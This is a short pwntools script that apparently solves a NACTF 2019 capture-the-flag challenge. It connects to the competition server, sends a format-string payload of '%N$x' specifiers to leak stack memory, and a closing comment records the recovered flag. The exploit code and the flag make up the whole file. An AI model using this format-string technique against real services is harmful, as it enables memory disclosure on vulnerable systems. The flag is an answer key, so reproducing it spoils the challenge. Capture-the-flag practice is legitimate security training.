from pwn import *
s = remote("shell.2019.nactf.com",31782)
payload = '%31$x-%32$x-%33$x-%34$x-%35$x-%36$x-%37$x-%38$x-%39$x-%40$x-%41$x-$42$x'
s.sendline(payload)
s.interactive()
# nactf{Pr1ntF_L34k_m3m0ry_r34d_nM05f469}